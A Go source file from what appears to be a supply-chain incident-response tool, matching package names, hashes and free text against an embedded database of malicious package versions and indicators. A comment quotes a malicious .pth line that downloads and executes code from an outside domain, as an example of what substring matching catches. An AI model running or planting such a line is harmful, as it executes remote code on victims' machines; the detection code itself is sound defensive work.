package iocdb

import (
	_ "embed"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/ardraayyappath/chainsaw/internal/evidence"
)

//go:embed iocs.yaml
var embeddedIOCs []byte

// Package describes a malicious package version with both hash representations.
type Package struct {
	Ecosystem string `yaml:"ecosystem"`
	Name      string `yaml:"name"`
	Version   string `yaml:"version"`
	// Shasum is the 40-hex SHA1 from the npm registry dist.shasum field.
	// Identifies the tarball; does not appear in lockfiles or _cacache.
	Shasum string `yaml:"shasum"`
	// Integrity is the sha512-<base64> SRI value from package-lock.json and
	// npm _cacache/content-v2. This is what the cache collector matches against.
	// Empty string means the value has not yet been recorded.
	Integrity string `yaml:"integrity"`
}

// Indicator is a single observable IOC: a domain, path, user-agent, email, or pth filename.
type Indicator struct {
	ID          string `yaml:"id"`
	Type        string `yaml:"type"`     // domain | path | ua | email | pth
	Value       string `yaml:"value"`
	Description string `yaml:"description"`
	Platform    string `yaml:"platform"` // macos | linux | windows | "" (all)
}

// Campaign groups all malicious packages and indicators for one threat activity cluster.
type Campaign struct {
	ID          string      `yaml:"id"`
	Description string      `yaml:"description"`
	Packages    []Package   `yaml:"packages"`
	Indicators  []Indicator `yaml:"indicators"`
}

type iocFile struct {
	Campaigns []Campaign `yaml:"campaigns"`
}

// IOCDatabase holds the fully parsed IOC database, ready for matching.
type IOCDatabase struct {
	campaigns []Campaign
}

// Load parses the embedded iocs.yaml and returns a ready-to-use IOCDatabase.
func Load() (*IOCDatabase, error) {
	return LoadFrom(embeddedIOCs)
}

// LoadFrom parses an arbitrary YAML payload. Useful for --ioc-db override and tests.
func LoadFrom(data []byte) (*IOCDatabase, error) {
	var f iocFile
	if err := yaml.Unmarshal(data, &f); err != nil {
		return nil, err
	}
	return &IOCDatabase{campaigns: f.Campaigns}, nil
}

// Match checks value against every indicator and malicious package specifier
// across all campaigns and returns the full set of hits.
//
// Matching rules:
//   - Package indicators:  value must equal "name@version" (case-insensitive)
//   - domain / email / pth: case-insensitive exact match
//   - ua: case-insensitive substring match (user-agent strings vary in practice)
//   - path: case-insensitive exact match (callers should expand ~ before calling)
func (db *IOCDatabase) Match(value string) []evidence.IOCMatch {
	var hits []evidence.IOCMatch
	lower := strings.ToLower(value)

	for _, c := range db.campaigns {
		// Check malicious package name@version strings.
		for _, pkg := range c.Packages {
			spec := strings.ToLower(pkg.Name + "@" + pkg.Version)
			if lower == spec {
				hits = append(hits, evidence.IOCMatch{
					IndicatorID:   c.ID + "-pkg-" + pkg.Name + "-" + pkg.Version,
					IndicatorType: "package",
					MatchedValue:  value,
					Description:   "Malicious " + pkg.Ecosystem + " package " + pkg.Name + "@" + pkg.Version,
					Campaign:      c.ID,
				})
			}
		}

		// Check all typed indicators.
		for _, ind := range c.Indicators {
			if matchIndicator(ind, lower) {
				hits = append(hits, evidence.IOCMatch{
					IndicatorID:   ind.ID,
					IndicatorType: ind.Type,
					MatchedValue:  value,
					Description:   ind.Description,
					Campaign:      c.ID,
				})
			}
		}
	}

	return hits
}

// MatchHash checks a hash value against both hash fields of every package entry.
//
// Accepts either format:
//   - "sha512-<base64>" — SRI integrity value from package-lock.json / npm _cacache
//   - 40-hex SHA1       — dist.shasum from npm registry metadata
//
// Called by the npm lockfile and cache collectors. Matching is case-insensitive.
func (db *IOCDatabase) MatchHash(hash string) []evidence.IOCMatch {
	var hits []evidence.IOCMatch
	if hash == "" {
		return hits
	}
	lower := strings.ToLower(hash)

	for _, c := range db.campaigns {
		for _, pkg := range c.Packages {
			var matchedField string
			switch {
			case pkg.Integrity != "" && strings.ToLower(pkg.Integrity) == lower:
				matchedField = "integrity (sha512)"
			case pkg.Shasum != "" && strings.ToLower(pkg.Shasum) == lower:
				matchedField = "shasum (sha1)"
			default:
				continue
			}
			hits = append(hits, evidence.IOCMatch{
				IndicatorID:   c.ID + "-hash-" + pkg.Name + "-" + pkg.Version,
				IndicatorType: "hash",
				MatchedValue:  hash,
				Description: "Hash matched " + matchedField + " for malicious " +
					pkg.Ecosystem + " package " + pkg.Name + "@" + pkg.Version,
				Campaign: c.ID,
			})
		}
	}

	return hits
}

// MatchContent scans free-form text for any indicator value using
// case-insensitive substring matching across every indicator type.
//
// This is the right call for unstructured text — .pth file lines, shell
// history entries, log lines — where an IOC value is embedded in a longer
// string rather than standing alone. For example, a .pth exec line:
//
//	exec(urllib.request.urlopen("https://models.litellm.cloud/beacon").read())
//
// contains the domain IOC "models.litellm.cloud" but would not match via
// the exact-match rules in Match(). MatchContent() catches it.
//
// Package name@version specifiers are intentionally excluded: those are
// structured values and should be matched with Match(), not substring search.
func (db *IOCDatabase) MatchContent(text string) []evidence.IOCMatch {
	var hits []evidence.IOCMatch
	if text == "" {
		return hits
	}
	lower := strings.ToLower(text)

	for _, c := range db.campaigns {
		for _, ind := range c.Indicators {
			if strings.Contains(lower, strings.ToLower(ind.Value)) {
				hits = append(hits, evidence.IOCMatch{
					IndicatorID:   ind.ID,
					IndicatorType: ind.Type,
					MatchedValue:  text,
					Description:   ind.Description,
					Campaign:      c.ID,
				})
			}
		}
	}
	return hits
}

// Campaigns returns all loaded campaigns. Used by the report generator.
func (db *IOCDatabase) Campaigns() []Campaign {
	return db.campaigns
}

// matchIndicator returns true if lowerValue matches the given indicator
// according to the type-specific rules documented on Match.
func matchIndicator(ind Indicator, lowerValue string) bool {
	indLower := strings.ToLower(ind.Value)
	switch ind.Type {
	case "ua":
		// Substring match: collected UA headers may include extra whitespace or version noise.
		return strings.Contains(lowerValue, indLower)
	default:
		// domain, path, email, pth — exact match.
		return lowerValue == indLower
	}
}
